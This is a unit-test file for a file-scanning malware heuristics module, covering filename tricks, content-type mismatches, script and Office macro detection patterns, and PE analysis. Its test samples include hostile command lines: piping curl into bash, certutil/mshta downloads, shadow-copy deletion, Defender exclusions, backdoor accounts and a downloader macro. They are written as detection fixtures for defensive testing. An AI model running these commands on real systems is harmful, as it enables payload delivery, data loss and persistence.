"""Unit tests for sentry.heuristics -- pure functions, so tested exhaustively."""
from __future__ import annotations

import math
import os
import unittest

from sentry import heuristics as H
from tests.support import (ASCII_TEXT, DATA_CHARS, MACHINE_I386, PEBuilder,
                           RDATA_CHARS, TEXT_CHARS, UNIFORM_BYTES, WX_CHARS,
                           TempEnvMixin, benign_pe, delta_for, has_reason,
                           reasons, total)

RLO = "\u202e"        # RIGHT-TO-LEFT OVERRIDE
LRM = "\u200e"        # LEFT-TO-RIGHT MARK
FSI = "\u2068"        # FIRST STRONG ISOLATE


# ==========================================================================
# shannon_entropy
# ==========================================================================

class TestShannonEntropy(unittest.TestCase):

    def test_empty_input_is_zero(self):
        self.assertEqual(H.shannon_entropy(b""), 0.0)

    def test_single_byte_is_zero(self):
        self.assertEqual(H.shannon_entropy(b"\x00"), 0.0)

    def test_all_same_byte_is_exactly_zero(self):
        for byte in (b"\x00", b"A", b"\xff"):
            with self.subTest(byte=byte):
                self.assertEqual(H.shannon_entropy(byte * 4096), 0.0)

    def test_uniform_over_256_values_is_exactly_eight_bits(self):
        self.assertAlmostEqual(H.shannon_entropy(UNIFORM_BYTES), 8.0, places=9)

    def test_two_equally_likely_bytes_is_one_bit(self):
        self.assertAlmostEqual(H.shannon_entropy(b"AB" * 512), 1.0, places=9)

    def test_biased_two_symbol_distribution_matches_closed_form(self):
        # 25% 'A', 75% 'B'  ->  -(0.25*log2 0.25 + 0.75*log2 0.75)
        data = b"A" * 256 + b"B" * 768
        expected = -(0.25 * math.log2(0.25) + 0.75 * math.log2(0.75))
        self.assertAlmostEqual(H.shannon_entropy(data), expected, places=9)

    def test_english_ascii_text_lands_in_the_four_to_five_bit_band(self):
        ent = H.shannon_entropy(ASCII_TEXT)
        self.assertGreater(ent, 4.0)
        self.assertLess(ent, 5.0)

    def test_random_bytes_are_near_the_packed_threshold(self):
        ent = H.shannon_entropy(os.urandom(65536))
        self.assertGreater(ent, 7.9, "os.urandom should look ~uniform")
        self.assertLessEqual(ent, 8.0)
        self.assertGreater(ent, 7.2, "must exceed the packed-section threshold")

    def test_result_never_exceeds_eight_bits_per_byte(self):
        for data in (b"", b"x", os.urandom(1000), UNIFORM_BYTES, ASCII_TEXT):
            self.assertLessEqual(H.shannon_entropy(data), 8.0)


# ==========================================================================
# check_filename
# ==========================================================================

class TestCheckFilenamePositive(unittest.TestCase):

    def test_double_extension_scores_32(self):
        hits = H.check_filename("/home/u/Downloads/invoice_2026.pdf.exe")
        self.assertEqual(total(hits), 32)
        self.assertIn("Double extension", reasons(hits)[0])
        self.assertIn("invoice_2026.pdf.exe", reasons(hits)[0],
                      "the reason must name the file so the user can act on it")

    def test_every_dangerous_double_extension_pair_is_detected(self):
        docs = ["pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt",
                "jpg", "jpeg", "png", "gif", "mp4", "mp3", "zip", "rar",
                "csv", "rtf", "htm", "html", "log", "json", "xml"]
        # .dll was in this list until a real Windows scan showed why it must
        # not be: System.Xml.dll, Newtonsoft.Json.dll and friends are ordinary
        # .NET assemblies, and a library cannot be launched by double-click,
        # so a doc-like middle part disguises nothing.
        exes = ["exe", "scr", "com", "bat", "cmd", "pif", "vbs", "vbe", "js",
                "jse", "wsf", "hta", "lnk", "ps1", "jar", "msi", "cpl"]
        for doc in docs:
            for exe in exes:
                name = f"/tmp/thing.{doc}.{exe}"
                with self.subTest(name=name):
                    self.assertEqual(delta_for(H.check_filename(name),
                                               "Double extension"), 32)

    def test_double_extension_is_case_insensitive(self):
        hits = H.check_filename("/tmp/REPORT.PDF.EXE")
        self.assertEqual(delta_for(hits, "Double extension"), 32)

    def test_double_extension_with_spaces_between_parts(self):
        hits = H.check_filename("/tmp/report.pdf .exe")
        self.assertEqual(delta_for(hits, "Double extension"), 32)

    def test_rlo_bidi_character_scores_40(self):
        hits = H.check_filename(f"/tmp/holiday{RLO}gpj.exe")
        self.assertEqual(delta_for(hits, "bidirectional-override"), 40)

    def test_all_bidi_control_characters_are_detected(self):
        for ch in sorted(H.BIDI_CHARS):
            with self.subTest(codepoint=f"U+{ord(ch):04X}"):
                hits = H.check_filename(f"/tmp/safe{ch}name.doc")
                self.assertEqual(delta_for(hits, "bidirectional-override"), 40)

    def test_bidi_detection_covers_the_documented_codepoints(self):
        # Guards against someone trimming the set: RLO/LRO/PDF/LRM/RLM/isolates.
        self.assertEqual({ord(c) for c in H.BIDI_CHARS},
                         {0x200E, 0x200F, 0x202A, 0x202B, 0x202C, 0x202D,
                          0x202E, 0x2066, 0x2067, 0x2068, 0x2069})

    def test_whitespace_padding_scores_28(self):
        hits = H.check_filename("/tmp/holiday_photo" + " " * 30 + ".exe")
        self.assertEqual(delta_for(hits, "whitespace run"), 28)

    def test_three_spaces_is_below_the_whitespace_threshold(self):
        self.assertIsNone(delta_for(H.check_filename("/tmp/setup   .exe"),
                                    "whitespace run"))

    def test_four_spaces_is_exactly_at_the_whitespace_threshold(self):
        self.assertEqual(delta_for(H.check_filename("/tmp/setup    .exe"),
                                   "whitespace run"), 28)

    def test_long_filename_boundary_is_160_characters(self):
        base = "a" * (160 - len(".txt"))
        self.assertEqual(len(base + ".txt"), 160)
        self.assertIsNone(delta_for(H.check_filename("/tmp/" + base + ".txt"),
                                    "Abnormally long"))
        self.assertEqual(delta_for(H.check_filename("/tmp/a" + base + ".txt"),
                                   "Abnormally long"), 8)

    def test_long_filename_counts_only_the_basename_not_the_directory(self):
        deep = "/tmp/" + "/".join("d" * 40 for _ in range(10)) + "/short.txt"
        self.assertGreater(len(deep), 160)
        self.assertIsNone(delta_for(H.check_filename(deep), "Abnormally long"))

    def test_executable_in_each_media_folder_scores_10(self):
        for folder in ("Pictures", "Music", "Videos", "Documents"):
            for ext in sorted(H.config.BINARY_EXT):
                with self.subTest(folder=folder, ext=ext):
                    hits = H.check_filename(f"/home/u/{folder}/thing{ext}")
                    self.assertEqual(delta_for(hits, "media/document folder"), 10)
                    self.assertIn(folder.lower(), reasons(hits)[0])

    def test_media_folder_match_is_case_insensitive(self):
        hits = H.check_filename("/home/u/PICTURES/thing.exe")
        self.assertEqual(delta_for(hits, "media/document folder"), 10)

    def test_random_looking_name_scores_12(self):
        hits = H.check_filename("/tmp/a8f3c91b2d47e05f.exe")
        self.assertEqual(delta_for(hits, "Random-looking"), 12)

    def test_random_name_threshold_is_16_characters(self):
        self.assertIsNone(delta_for(H.check_filename("/tmp/" + "a" * 15 + ".exe"),
                                    "Random-looking"))
        self.assertEqual(delta_for(H.check_filename("/tmp/" + "a" * 16 + ".exe"),
                                   "Random-looking"), 12)

    def test_random_name_rule_only_applies_to_exe_dll_scr(self):
        for ext in (".exe", ".dll", ".scr"):
            self.assertEqual(delta_for(H.check_filename("/tmp/" + "b" * 20 + ext),
                                       "Random-looking"), 12, ext)
        for ext in (".txt", ".msi", ".sys", ".ps1", ".com"):
            self.assertIsNone(delta_for(H.check_filename("/tmp/" + "b" * 20 + ext),
                                        "Random-looking"), ext)

    def test_multiple_tricks_on_one_name_accumulate(self):
        name = "/home/u/Pictures/report.pdf" + " " * 8 + ".exe"
        hits = H.check_filename(name)
        # double-extension 32 + whitespace 28 + media folder 10
        self.assertEqual(total(hits), 70)
        self.assertEqual(len(hits), 3)


class TestCheckFilenameNegative(unittest.TestCase):
    """The false-positive floor. Everything here must score exactly zero."""

    ORDINARY = [
        "report.pdf",
        "setup.exe",
        "My Vacation Photo.jpg",
        "v1.2.3-release.exe",
        "python-3.12.4-amd64.exe",
        "notes.txt",
        "budget 2026.xlsx",
        "archive.tar.gz",
        "vcruntime140.dll",
        "api-ms-win-core-file-l1-1-0.dll",
        "msvcp140_1.dll",
        "d3dcompiler_47.dll",
        "unins000.exe",
        "Rapport_Financier_Ete.docx",
        "\u0416\u0443\u0440\u043d\u0430\u043b.pdf",     # Cyrillic
        "\u6587\u66f8.docx",                            # CJK
        "caf\u00e9-menu.pdf",                           # accented Latin
        "\U0001f4c8 quarterly.xlsx",                    # emoji (non-bidi)
        "README",
        ".gitignore",
        "libssl-3-x64.dll",
    ]

    def test_ordinary_filenames_score_zero(self):
        for name in self.ORDINARY:
            with self.subTest(name=name):
                self.assertEqual(H.check_filename("/home/u/Downloads/" + name), [])

    def test_dotnet_namespace_dlls_are_not_a_double_extension(self):
        """Regression: five of twenty findings in a real D: scan were these."""
        for name in ("System.Xml.dll", "Newtonsoft.Json.dll",
                     "System.Text.Json.dll", "System.Runtime.Serialization.Xml.dll",
                     "report.pdf.dll"):
            with self.subTest(name=name):
                self.assertIsNone(
                    delta_for(H.check_filename("/tmp/" + name), "Double extension"))

    def test_dots_in_the_stem_are_not_a_double_extension(self):
        for name in ("v1.2.3-release.exe", "node-v20.11.0-x64.msi",
                     "openssl-1.1.1w.exe", "app.v2.exe"):
            with self.subTest(name=name):
                self.assertIsNone(
                    delta_for(H.check_filename("/tmp/" + name), "Double extension"))

    def test_non_ascii_names_do_not_trip_the_bidi_rule(self):
        for name in ("\u0416\u0443\u0440\u043d\u0430\u043b.pdf",
                     "\u0645\u0644\u0641.pdf",          # Arabic, but no override
                     "\u05e7\u05d5\u05d1\u05e5.pdf"):   # Hebrew, but no override
            with self.subTest(name=name):
                self.assertIsNone(delta_for(H.check_filename("/tmp/" + name),
                                            "bidirectional-override"))

    def test_media_folder_rule_ignores_non_executables(self):
        for name in ("holiday.jpg", "song.mp3", "clip.mp4", "letter.docx"):
            with self.subTest(name=name):
                self.assertEqual(H.check_filename("/home/u/Pictures/" + name), [])

    def test_executable_in_downloads_is_not_a_media_folder_hit(self):
        self.assertEqual(H.check_filename("/home/u/Downloads/setup.exe"), [])

    def test_bare_filename_without_a_directory_does_not_crash(self):
        self.assertEqual(H.check_filename("setup.exe"), [])

    # ---- regression test for a fixed false positive ---------------------

    def test_BUG_lowercase_windows_dll_names_look_random(self):
        """REGRESSION TEST (fixed): the random-name rule now has a randomness test.

        The bug described below is fixed in this build; this test now guards
        against a regression.

        Original report: BUG heuristics.py:183 -- `[a-z0-9]{16,}` has no randomness test.

        Legitimate .NET / Windows DLLs whose names are one long lowercase word
        are scored 12 as "Random-looking filename typical of dropped payloads".
        A real randomness signal (character-bigram improbability, or requiring
        a mix of digits and letters) is needed. 12 points alone stays under the
        default threshold of 25, but it pushes unsigned system DLLs over it
        once combined with "No embedded Authenticode signature" (6) plus any
        single other finding.
        """
        for name in ("presentationframework.dll", "windowsformsintegration.dll",
                     "microsoftaccessibility.dll", "reachframework.dll"):
            with self.subTest(name=name):
                self.assertIsNone(delta_for(H.check_filename("/tmp/" + name),
                                            "Random-looking"))


# ==========================================================================
# check_content_type_mismatch
# ==========================================================================

DOC_LIKE_EXTENSIONS = [
    ".txt", ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".doc", ".docx",
    ".xls", ".xlsx", ".csv", ".rtf", ".log", ".json", ".xml", ".mp3",
    ".mp4", ".html", ".htm",
]

PE_HEADER = b"MZ\x90\x00\x03\x00\x00\x00"
ELF_HEADER = b"\x7fELF\x02\x01\x01\x00"
JPEG_HEADER = b"\xff\xd8\xff\xe0\x00\x10JFIF"
PNG_HEADER = b"\x89PNG\r\n\x1a\n"


class TestContentTypeMismatch(unittest.TestCase):

    def test_pe_behind_every_doc_like_extension_scores_45(self):
        for ext in DOC_LIKE_EXTENSIONS:
            with self.subTest(ext=ext):
                hits = H.check_content_type_mismatch("/tmp/thing" + ext, PE_HEADER)
                self.assertEqual(len(hits), 1)
                self.assertEqual(hits[0][0], 45)
                self.assertIn("Windows PE", hits[0][1])
                self.assertIn(ext, hits[0][1])

    def test_elf_behind_every_doc_like_extension_scores_45(self):
        for ext in DOC_LIKE_EXTENSIONS:
            with self.subTest(ext=ext):
                hits = H.check_content_type_mismatch("/tmp/thing" + ext, ELF_HEADER)
                self.assertEqual(len(hits), 1)
                self.assertEqual(hits[0][0], 45)
                self.assertIn("ELF", hits[0][1])

    def test_extension_match_is_case_insensitive(self):
        self.assertEqual(delta_for(
            H.check_content_type_mismatch("/tmp/Thing.TXT", PE_HEADER),
            "Windows PE"), 45)

    def test_extensionless_pe_scores_15(self):
        hits = H.check_content_type_mismatch("/tmp/svchost", PE_HEADER)
        self.assertEqual(hits, [(15, "Extensionless file containing a PE executable")])

    def test_pe_named_exe_is_not_a_mismatch(self):
        for ext in (".exe", ".dll", ".sys", ".scr", ".com", ".ocx", ".cpl", ".msi"):
            with self.subTest(ext=ext):
                self.assertEqual(
                    H.check_content_type_mismatch("/tmp/real" + ext, PE_HEADER), [])

    def test_real_jpeg_named_jpg_is_not_a_mismatch(self):
        self.assertEqual(
            H.check_content_type_mismatch("/tmp/photo.jpg", JPEG_HEADER), [])

    def test_real_png_named_png_is_not_a_mismatch(self):
        self.assertEqual(
            H.check_content_type_mismatch("/tmp/photo.png", PNG_HEADER), [])

    def test_plain_text_named_txt_is_not_a_mismatch(self):
        self.assertEqual(
            H.check_content_type_mismatch("/tmp/a.txt", b"Dear Sir,\nHello"), [])

    def test_empty_header_never_fires(self):
        self.assertEqual(H.check_content_type_mismatch("/tmp/a.txt", b""), [])
        self.assertEqual(H.check_content_type_mismatch("/tmp/noext", b""), [])

    def test_mz_must_be_at_offset_zero(self):
        self.assertEqual(
            H.check_content_type_mismatch("/tmp/a.txt", b"\x00MZ\x90\x00"), [])

    def test_extensionless_elf_is_deliberately_not_flagged(self):
        # Documents an asymmetry: the extensionless rule is PE-only, because a
        # Windows-targeted scanner sees extensionless ELF files constantly on
        # mounted volumes. Change this test if that decision changes.
        self.assertEqual(H.check_content_type_mismatch("/tmp/binary", ELF_HEADER), [])

    def test_doc_like_set_has_not_silently_shrunk(self):
        # The set is function-local in heuristics.py, so probe it behaviourally.
        for ext in DOC_LIKE_EXTENSIONS:
            self.assertTrue(
                H.check_content_type_mismatch("/tmp/x" + ext, PE_HEADER),
                f"{ext} dropped out of the doc-like extension set")


# ==========================================================================
# analyse_script
# ==========================================================================

# One positive sample per entry in SCRIPT_PATTERNS, keyed by expected delta and
# a distinctive fragment of the expected reason.
SCRIPT_CASES = [
    (18, "FromBase64String",
     b"$d = [Convert]::FromBase64String($payload)\n"),
    (30, "encoded-command",
     b"powershell.exe -enc " + b"SQBuAHYAbwBrAGUA" * 5 + b"\n"),
    (16, "Invoke-Expression",
     b"$cmd = 'Get-Date'\nIEX $cmd\n"),
    (18, "Remote payload download",
     b"(New-Object Net.WebClient).DownloadString('http://host/a')\n"),
    (16, "hidden window flags",
     b"Start-Process powershell -w hidden -File .\\a.ps1\n"),
    (20, "assembly loading",
     b"[Reflection.Assembly]::Load($raw)\n"),
    (35, "Defender exclusions",
     b"Add-MpPreference -ExclusionPath 'C:\\Users\\Public'\n"),
    (40, "shadow copies",
     b"vssadmin delete shadows /all /quiet\n"),
    (12, "Secure-wipe",
     b"cipher /w:C\n"),
    (18, "autostart persistence",
     b"schtasks /create /sc onlogon /tn Updater /tr calc.exe\n"),
    (25, "local account",
     b"net localgroup administrators helper /add\n"),
    (20, "Character-code string obfuscation",
     b's = chr(72) & chr(101) & chr(108) & chr(111)\n'),
    (22, "Nested eval/decode",
     b"eval(atob('YWxlcnQoMSk='))\n"),
    (14, "WScript.Shell",
     b'Set o = CreateObject("WScript.Shell")\no.Run "calc.exe"\n'),
    (28, "certutil",
     b"certutil -urlcache -split -f http://host/a.txt out.txt\n"),
    (26, "mshta remote execution",
     b"mshta http://host/payload.hta\n"),
    (30, "rundll32 script execution",
     b'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";x=1\n'),
    (26, "Pipes remote content",
     b"curl http://host/install.sh | bash\n"),
]


class TestAnalyseScript(unittest.TestCase):

    def test_every_script_pattern_has_a_positive_sample(self):
        self.assertEqual(len(SCRIPT_CASES), len(H.SCRIPT_PATTERNS),
                         "a SCRIPT_PATTERNS entry was added without a test case")
        covered = {(d, r) for d, r, _ in SCRIPT_CASES}
        # Entries carry a scope tag now ("ps" patterns only run on PowerShell-
        # idiom extensions, so a .py/.js/.jar cannot match a PowerShell idiom).
        for _pat, delta, reason, _scope in H.SCRIPT_PATTERNS:
            self.assertTrue(
                any(delta == d and frag.lower() in reason.lower()
                    for d, frag in covered),
                f"no positive sample covers: {reason!r} ({delta})")

    def test_each_sample_fires_its_pattern_with_the_documented_delta(self):
        for delta, fragment, sample in SCRIPT_CASES:
            with self.subTest(fragment=fragment):
                hits = H.analyse_script("/tmp/a.ps1", sample)
                self.assertEqual(delta_for(hits, fragment), delta,
                                 f"got {reasons(hits)}")

    def test_each_sample_fires_exactly_one_pattern(self):
        """Keeps the samples surgical: overlap would hide a broken pattern."""
        for delta, fragment, sample in SCRIPT_CASES:
            with self.subTest(fragment=fragment):
                hits = H.analyse_script("/tmp/a.ps1", sample)
                self.assertEqual(len(hits), 1,
                                 f"{fragment} sample also matched {reasons(hits)}")

    def test_patterns_are_case_insensitive(self):
        for sample in (b"vssadmin delete shadows", b"VSSADMIN DELETE SHADOWS",
                       b"VssAdmin Delete Shadows"):
            with self.subTest(sample=sample):
                self.assertEqual(delta_for(H.analyse_script("/tmp/a.bat", sample),
                                           "shadow copies"), 40)

    def test_long_base64_blob_scores_12_once_only(self):
        # Retuned 15 -> 12, and the rule now requires a decoder in the same file:
        # a long base64 constant on its own is a certificate/asset blob in far
        # more benign files than malicious ones.
        sample = b"$x = '" + b"QUJDRA" * 60 + b"'\n[Convert]::FromBase64String($x)\n"
        hits = H.analyse_script("/tmp/a.ps1", sample)
        blob = [(d, r) for d, r in hits if "base64-like blob" in r]
        self.assertEqual(len(blob), 1, "must report at most one blob finding")
        self.assertEqual(blob[0][0], 12)
        self.assertIn("360 chars", blob[0][1])

    def test_a_long_base64_blob_without_a_decoder_is_not_flagged(self):
        sample = b"$cert = '" + b"QUJDRA" * 60 + b"'\n"
        self.assertIsNone(delta_for(H.analyse_script("/tmp/a.ps1", sample),
                                    "base64-like blob"))

    def test_base64_blob_threshold_is_200_characters(self):
        decoder = b"[Convert]::FromBase64String($x)\n"
        self.assertIsNone(delta_for(
            H.analyse_script("/tmp/a.ps1", b"x='" + b"A" * 199 + b"'" + decoder),
            "base64-like blob"))
        self.assertEqual(delta_for(
            H.analyse_script("/tmp/a.ps1", b"x='" + b"A" * 200 + b"'" + decoder),
            "base64-like blob"), 12)

    def test_mostly_binary_script_scores_12(self):
        # The bytes must not decode as UTF-8/UTF-16: non-Latin source data is
        # legitimately non-printable bytewise and accounted for every clean hit,
        # so valid text in any encoding is now exempt.
        # 0xD8D8 is an unpaired surrogate in both UTF-16 byte orders and an
        # invalid lead byte in UTF-8, so this is binary in every encoding.
        sample = b"\xd8\xd8" * 300 + b"readable" * 10
        hits = H.analyse_script("/tmp/a.js", sample)
        self.assertEqual(delta_for(hits, "non-printable"), 12)

    def test_non_printable_rule_needs_more_than_512_bytes(self):
        self.assertIsNone(delta_for(
            H.analyse_script("/tmp/a.js", b"\xd8\xd8" * 256), "non-printable"))
        self.assertEqual(delta_for(
            H.analyse_script("/tmp/a.js", b"\xd8\xd8" * 256 + b"\xd8"),
            "non-printable"), 12)

    def test_non_printable_rule_threshold_is_70_percent_printable(self):
        # 700 printable / 1000 total == 0.70 exactly -> not flagged.
        # \xd8 runs are non-printable and invalid in UTF-8 and UTF-16 alike.
        sample = b"a" * 700 + b"\xd8" * 300
        self.assertIsNone(delta_for(H.analyse_script("/tmp/a.js", sample),
                                    "non-printable"))
        sample = b"a" * 699 + b"\xd8" * 301
        self.assertEqual(delta_for(H.analyse_script("/tmp/a.js", sample),
                                   "non-printable"), 12)

    def test_tabs_and_newlines_count_as_printable(self):
        self.assertEqual(H.analyse_script("/tmp/a.js", b"\t\r\n" * 400), [])

    def test_empty_data_yields_nothing(self):
        self.assertEqual(H.analyse_script("/tmp/a.ps1", b""), [])

    def test_only_the_first_512kb_is_examined(self):
        padding = b"# comment line\n" * 40000            # > 512 KiB
        self.assertGreater(len(padding), H.SCRIPT_SNIFF_BYTES)
        sample = padding + b"vssadmin delete shadows\n"
        self.assertEqual(H.analyse_script("/tmp/a.ps1", sample), [],
                         "content past SCRIPT_SNIFF_BYTES must be ignored")

    # ---- negative: legitimate scripts ----------------------------------

    LEGIT_POWERSHELL = b"""\
# Nightly backup of the project folder to the archive drive.
param([string]$Source = "C:\\Projects", [string]$Target = "D:\\Archive")

$stamp = Get-Date -Format "yyyy-MM-dd"
$dest  = Join-Path $Target $stamp
New-Item -ItemType Directory -Path $dest -Force | Out-Null

Get-ChildItem -Path $Source -Recurse -File |
    Where-Object { $_.Length -lt 500MB } |
    ForEach-Object {
        Copy-Item $_.FullName -Destination $dest -Force
    }

Write-Host "Copied to $dest"
Get-ChildItem $Target | Sort-Object CreationTime |
    Select-Object -First 1 | Remove-Item -Recurse -Force
"""

    LEGIT_BATCH = b"""\
@echo off
setlocal
if "%~1"=="" (echo usage: build.bat ^<target^> & exit /b 1)
msbuild /nologo /v:m /p:Configuration=Release %~1
if errorlevel 1 (echo build failed & exit /b 1)
copy /y bin\\Release\\*.dll ..\\dist\\
echo done
"""

    LEGIT_PYTHON = b"""\
import csv, sys
def main(path):
    with open(path, newline="") as fh:
        rows = list(csv.DictReader(fh))
    total = sum(float(r["amount"]) for r in rows)
    print(f"{len(rows)} rows, total {total:.2f}")
    return 0
if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1]))
"""

    LEGIT_SHELL = b"""\
#!/bin/sh
set -eu
mkdir -p "$HOME/.cache/app"
if [ ! -f "$HOME/.cache/app/db" ]; then
  printf 'creating cache\\n'
  : > "$HOME/.cache/app/db"
fi
exec /usr/bin/app --cache "$HOME/.cache/app" "$@"
"""

    def test_legitimate_scripts_score_zero(self):
        for name, body in (("backup.ps1", self.LEGIT_POWERSHELL),
                           ("build.bat", self.LEGIT_BATCH),
                           ("report.py", self.LEGIT_PYTHON),
                           ("launch.sh", self.LEGIT_SHELL)):
            with self.subTest(name=name):
                hits = H.analyse_script("/tmp/" + name, body)
                self.assertEqual(hits, [], f"false positives: {reasons(hits)}")

    def test_word_boundary_prevents_iex_substring_matches(self):
        for sample in (b"$index = 1\n", b"# see also: dexterity\n",
                       b"Set-Variable -Name apex -Value 3\n"):
            with self.subTest(sample=sample):
                self.assertIsNone(delta_for(H.analyse_script("/tmp/a.ps1", sample),
                                            "Invoke-Expression"))

    def test_short_encoded_flag_without_a_blob_is_not_flagged(self):
        self.assertEqual(
            H.analyse_script("/tmp/a.ps1", b"powershell -enc QUJD\n"), [])

    # ---- regression tests for fixed bugs --------------------------------

    def test_BUG_net_user_add_with_a_username_is_missed(self):
        """BUG heuristics.py:132 -- `net\\s+user\\s+/add` cannot match reality.

        `net user /add` with nothing in between is not a valid command; the real
        account-creation form always carries a username (and usually a
        password) between `user` and `/add`. The pattern therefore only matches
        a string no attacker would ever write, so the 25-point "Creates or
        elevates a local account" rule is dead for the `net user` case. Needs
        `net\\s+user\\s+\\S+.{0,40}/add`. The `net localgroup` alternative in the
        same pattern is written correctly and does fire.
        """
        for sample in (b"net user backdoor /add\n",
                       b"net user helper Passw0rd! /add\n",
                       b'net user "svc acct" P@ss /add /y\n'):
            with self.subTest(sample=sample):
                self.assertEqual(delta_for(H.analyse_script("/tmp/a.bat", sample),
                                           "local account"), 25)


# ==========================================================================
# analyse_macro_office
# ==========================================================================

class TestAnalyseMacroOffice(unittest.TestCase):

    MARKERS = [
        (12, "VBA macro project", b"word/vbaProject.bin"),
        (20, "Auto_Open", b"Sub Auto_Open()\nEnd Sub"),
        (20, "AutoOpen", b"Sub AutoOpen()\nEnd Sub"),
        (18, "Document_Open", b"Private Sub Document_Open()"),
        (18, "Workbook_Open", b"Private Sub Workbook_Open()"),
        (22, "invokes Shell()", b'x = Shell("calc.exe", 1)'),
        (12, "CreateObject", b'Set o = CreateObject("Scripting.FileSystemObject")'),
        (25, "references PowerShell", b'cmd = "powershell -File a.ps1"'),
        (22, "URLMON", b'Declare Function URLDownloadToFile Lib "urlmon"'),
    ]

    def test_every_marker_fires_with_its_documented_delta(self):
        for delta, fragment, sample in self.MARKERS:
            with self.subTest(fragment=fragment):
                hits = H.analyse_macro_office("/tmp/a.docm", sample)
                self.assertEqual(delta_for(hits, fragment), delta,
                                 f"got {reasons(hits)}")

    def test_utf16_attribute_marker_detects_a_vba_project(self):
        blob = b"\x00A\x00t\x00t\x00r\x00i\x00b\x00u\x00t\x00e"
        hits = H.analyse_macro_office("/tmp/a.doc", blob)
        self.assertEqual(delta_for(hits, "VBA macro project"), 12)

    def test_markers_are_case_insensitive(self):
        for sample in (b"AUTO_OPEN", b"auto_open", b"Auto_Open"):
            with self.subTest(sample=sample):
                self.assertEqual(delta_for(
                    H.analyse_macro_office("/tmp/a.doc", sample),
                    "Auto_Open"), 20)

    def test_a_realistic_downloader_macro_accumulates(self):
        blob = (b"word/vbaProject.bin\x00"
                b"Sub AutoOpen()\n"
                b'  Set o = CreateObject("WScript.Shell")\n'
                b'  o.Run "powershell -w hidden -c iwr http://h/a"\n'
                b"End Sub\n")
        hits = H.analyse_macro_office("/tmp/invoice.docm", blob)
        # project 12 + AutoOpen 20 + CreateObject 12 + powershell 25
        self.assertEqual(total(hits), 69)
        self.assertEqual(len(hits), 4)

    def test_shell_marker_requires_the_opening_parenthesis(self):
        self.assertIsNone(delta_for(
            H.analyse_macro_office("/tmp/a.doc", b"the shell of a nut"),
            "invokes Shell()"))

    def test_plain_office_document_bytes_score_zero(self):
        blob = (b"PK\x03\x04" + b"word/document.xml" + b"\x00" * 100
                + b"<w:p><w:r><w:t>Quarterly figures</w:t></w:r></w:p>")
        self.assertEqual(H.analyse_macro_office("/tmp/a.docx", blob), [])

    def test_empty_document_scores_zero(self):
        self.assertEqual(H.analyse_macro_office("/tmp/a.docm", b""), [])

    def test_only_the_first_2mb_is_examined(self):
        blob = b"\x20" * (2 * 1024 * 1024) + b"auto_open"
        self.assertEqual(H.analyse_macro_office("/tmp/a.docm", blob), [])


# ==========================================================================
# severity_for
# ==========================================================================

class TestSeverityFor(unittest.TestCase):

    def test_exact_band_boundaries(self):
        cases = [(-100, "info"), (-1, "info"), (0, "info"), (1, "info"),
                 (24, "info"), (25, "low"), (26, "low"),
                 (44, "low"), (45, "medium"), (46, "medium"),
                 (69, "medium"), (70, "high"), (71, "high"),
                 (100, "high"), (1000, "high")]
        for score, expected in cases:
            with self.subTest(score=score):
                self.assertEqual(H.severity_for(score), expected)

    def test_bands_are_contiguous_and_monotonic(self):
        order = {"info": 0, "low": 1, "medium": 2, "high": 3}
        previous = 0
        for score in range(0, 101):
            rank = order[H.severity_for(score)]
            self.assertGreaterEqual(rank, previous,
                                    f"severity went backwards at {score}")
            previous = rank

    def test_every_band_is_reachable(self):
        self.assertEqual({H.severity_for(s) for s in range(0, 101)},
                         {"info", "low", "medium", "high"})


# ==========================================================================
# analyse_pe -- driven by the hand-rolled PE writer
# ==========================================================================

class TestAnalysePE(TempEnvMixin, unittest.TestCase):

    def setUp(self):
        super().setUp()
        if not H.HAVE_PEFILE:
            self.skipTest("pefile is not installed; PE analysis is a no-op")

    def analyse(self, builder: PEBuilder, name: str = "sample.exe"):
        path = builder.write(self.sandbox / name)
        return H.analyse_pe(str(path))

    # ---- baseline -------------------------------------------------------

    def test_a_well_formed_signed_pe_produces_no_findings(self):
        hits, meta = self.analyse(benign_pe())
        self.assertEqual(hits, [], f"false positives: {reasons(hits)}")
        self.assertEqual(meta["sections"], 4)
        self.assertEqual(meta["imports"], 8)
        self.assertEqual(meta["packers"], [])
        self.assertEqual(meta["api_groups"], [])
        self.assertTrue(meta["signed"])
        self.assertFalse(meta["is_dll"])
        self.assertEqual(meta["machine"], "0x8664")

    def test_metadata_reports_dll_and_machine_correctly(self):
        _hits, meta = self.analyse(benign_pe(dll=True), "sample.dll")
        self.assertTrue(meta["is_dll"])
        _hits, meta = self.analyse(benign_pe(machine=MACHINE_I386, plus=False),
                                   "x86.exe")
        self.assertEqual(meta["machine"], hex(MACHINE_I386))

    def test_missing_signature_is_reported_without_score(self):
        """Retuned: an absent Authenticode signature is now worth 0.

        Most benign software on a normal machine is unsigned (in-house tools,
        open-source builds, anything built locally), and this rule alone caused
        a large share of the measured false positives. It is kept as a reported
        observation so the finding text still mentions it.
        """
        hits, meta = self.analyse(benign_pe().sign(False))
        self.assertFalse(meta["signed"])
        self.assertEqual(delta_for(hits, "Authenticode"), 0)

    # ---- sections -------------------------------------------------------

    def test_upx_named_section_reports_the_packer_and_scores_25(self):
        b = (PEBuilder().add_text(0x400)
             .add_section("UPX1", b"packed" * 100, TEXT_CHARS)
             .set_entry_in_section(0).sign())
        hits, meta = self.analyse(b)
        self.assertEqual(delta_for(hits, "Known packer"), 25)
        self.assertIn("UPX", reasons(hits)[0])
        self.assertEqual(meta["packers"], ["UPX"])

    def test_every_known_packer_section_name_is_recognised(self):
        for lname, label in sorted(H.PACKER_SECTIONS.items()):
            with self.subTest(section=lname):
                b = (PEBuilder().add_text(0x400)
                     .add_section(lname, b"x" * 300, RDATA_CHARS)
                     .set_entry_in_section(0).sign())
                _hits, meta = self.analyse(b, f"p_{lname.strip('.')}.exe")
                self.assertEqual(meta["packers"], [label])

    def test_a_packer_section_is_not_also_reported_as_a_nonstandard_name(self):
        b = (PEBuilder().add_text(0x400)
             .add_section("UPX1", b"x" * 300, RDATA_CHARS)
             .set_entry_in_section(0).sign())
        hits, _meta = self.analyse(b)
        self.assertFalse(has_reason(hits, "Non-standard section name"))

    def test_high_entropy_executable_section_scores_16(self):
        b = (PEBuilder().add_text(0x400)
             .add_section(".text2", os.urandom(16384), TEXT_CHARS)
             .set_entry_in_section(0).sign())
        hits, _meta = self.analyse(b)
        self.assertEqual(delta_for(hits, "High-entropy"), 16)
        reason = next(r for _d, r in hits if "High-entropy" in r)
